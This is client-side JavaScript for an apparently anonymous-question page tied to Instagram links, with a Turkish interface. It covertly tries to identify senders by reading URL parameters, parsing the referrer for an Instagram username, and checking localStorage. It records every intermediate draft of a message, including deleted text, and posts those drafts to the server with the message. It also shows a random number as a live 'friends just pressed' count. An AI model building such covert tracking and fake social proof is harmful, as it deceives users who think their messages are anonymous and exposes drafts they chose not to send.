let linkCode = '';
let senderUsername = '';
let messageStates = [];
let isTyping = false;
let typingTimeout = null;
let currentMessageId = null;

// Get Instagram username from URL or referrer
function getInstagramUsername() {
    // Try to get from URL parameters (Instagram deep link)
    const urlParams = new URLSearchParams(window.location.search);
    let username = urlParams.get('username') || urlParams.get('ig_user');
    
    // Try to get from referrer (Instagram web view)
    if (!username && document.referrer) {
        const referrerMatch = document.referrer.match(/instagram\.com\/([^\/\?]+)/);
        if (referrerMatch) {
            username = referrerMatch[1];
        }
    }
    
    // Try to get from localStorage (if previously set)
    if (!username) {
        username = localStorage.getItem('ig_username');
    }
    
    // If still no username, prompt (for testing)
    if (!username) {
        username = prompt('Instagram kullanıcı adınızı girin:') || 'anonim';
        if (username !== 'anonim') {
            localStorage.setItem('ig_username', username);
        }
    }
    
    // Clean username (remove @ if exists)
    return username.replace('@', '').trim().toLowerCase();
}

// Initialize page
document.addEventListener('DOMContentLoaded', async () => {
    linkCode = window.location.pathname.substring(1);
    
    if (!linkCode || linkCode === '') {
        window.location.href = '/';
        return;
    }

    // Get sender username (in real app, this would come from Instagram)
    senderUsername = getInstagramUsername();

    // Load link info
    await loadLinkInfo();

    // Setup event listeners
    setupEventListeners();

    // Load suggested questions
    loadSuggestedQuestions();
});

async function loadLinkInfo() {
    try {
        const response = await fetch(`/api/link/${linkCode}`);
        const data = await response.json();

        if (response.status === 410) {
            alert('Bu bağlantı süresi dolmuş!');
            window.location.href = '/';
            return;
        }

        if (!response.ok) {
            alert('Bağlantı bulunamadı!');
            window.location.href = '/';
            return;
        }

        // Update UI
        document.getElementById('username').textContent = `@${data.username}`;
        document.getElementById('profileImage').src = data.profileImage;
        
        // Update page title with username
        document.getElementById('pageTitle').textContent = `@${data.username}`;
        document.title = `@${data.username}`;
        
        // Update stats (random number for demo)
        const stats = Math.floor(Math.random() * 500) + 100;
        document.getElementById('statsText').textContent = `${stats} arkadaşlar az önce bastı`;
        document.getElementById('modalStats').textContent = `${stats} arkadaşlar az önce bastı`;
    } catch (error) {
        console.error('Error loading link info:', error);
        alert('Bir hata oluştu!');
    }
}

function setupEventListeners() {
    const messageInput = document.getElementById('messageInput');
    const sendBtn = document.getElementById('sendBtn');
    const getMessagesBtn = document.getElementById('getMessagesBtn');
    const diceBtn = document.getElementById('diceBtn');
    const backBtn = document.getElementById('backBtn');
    const sendAnotherBtn = document.getElementById('sendAnotherBtn');
    const successModal = document.getElementById('successModal');

    // Message input change
    messageInput.addEventListener('input', (e) => {
        const text = e.target.value;
        
        // Show/hide buttons
        if (text.trim().length > 0) {
            sendBtn.style.display = 'block';
            getMessagesBtn.style.display = 'none';
        } else {
            sendBtn.style.display = 'none';
            getMessagesBtn.style.display = 'block';
        }

        // Track message states (harf harf)
        if (!isTyping) {
            isTyping = true;
            messageStates = [];
        }

        // Save current state (only if it's different from last state)
        if (messageStates.length === 0 || messageStates[messageStates.length - 1] !== text) {
            messageStates.push(text);
        }

        // Send state to server periodically
        clearTimeout(typingTimeout);
        typingTimeout = setTimeout(() => {
            sendMessageState(text, false);
        }, 500);
    });

    // Send button
    sendBtn.addEventListener('click', async () => {
        const messageText = messageInput.value.trim();
        if (!messageText) return;

        const isDice = messageInput.dataset.isDice === 'true';
        await sendMessage(messageText, isDice);
    });

    // Dice button
    diceBtn.addEventListener('click', async () => {
        try {
            const response = await fetch('/api/random-question');
            const data = await response.json();
            
            // Clear previous states
            messageStates = [];
            isTyping = false;
            
            // Set the question directly (zar ile yazdırıldığı için harf harf değil)
            messageInput.value = data.question;
            
            // Show send button
            sendBtn.style.display = 'block';
            getMessagesBtn.style.display = 'none';
            
            // Mark that this will be a dice question when sent
            messageInput.dataset.isDice = 'true';
        } catch (error) {
            console.error('Error getting random question:', error);
        }
    });

    // Back button
    backBtn.addEventListener('click', () => {
        successModal.style.display = 'none';
        resetForm();
    });

    // Send another button
    sendAnotherBtn.addEventListener('click', (e) => {
        e.preventDefault();
        successModal.style.display = 'none';
        resetForm();
    });
}

async function sendMessageState(text, isDice) {
    // This will be saved when message is sent
    // For now, we just track it locally
}

async function sendMessage(messageText, isDiceQuestion) {
    // Check if this is a dice question
    const isDice = messageInput.dataset.isDice === 'true' || isDiceQuestion;
    
    try {
        const response = await fetch('/api/message', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                linkCode: linkCode,
                senderUsername: senderUsername,
                messageText: messageText,
                messageStates: isDice ? [] : messageStates, // Zar ile yazıldıysa state yok
                isDiceQuestion: isDice
            })
        });

        const data = await response.json();

        if (response.ok) {
            // Show success modal
            document.getElementById('successModal').style.display = 'flex';
            currentMessageId = data.messageId;
            
            // Clear dice flag
            delete messageInput.dataset.isDice;
        } else {
            alert(data.error || 'Mesaj gönderilemedi!');
        }
    } catch (error) {
        console.error('Error sending message:', error);
        alert('Sunucu hatası!');
    }
}

function resetForm() {
    const messageInput = document.getElementById('messageInput');
    messageInput.value = '';
    delete messageInput.dataset.isDice;
    document.getElementById('sendBtn').style.display = 'none';
    document.getElementById('getMessagesBtn').style.display = 'block';
    messageStates = [];
    isTyping = false;
    currentMessageId = null;
}

function loadSuggestedQuestions() {
    const questions = [
        "İkinci şanslara inanır mısın?",
        "En büyük korkun nedir?",
        "Hayatındaki en mutlu an?",
        "Bir dilek hakkın olsa ne dilerdin?"
    ];

    const container = document.getElementById('suggestedQuestions');
    questions.forEach(question => {
        const questionEl = document.createElement('div');
        questionEl.className = 'suggested-question';
        questionEl.textContent = question;
        questionEl.style.opacity = '0.5';
        questionEl.style.cursor = 'default';
        container.appendChild(questionEl);
    });
}

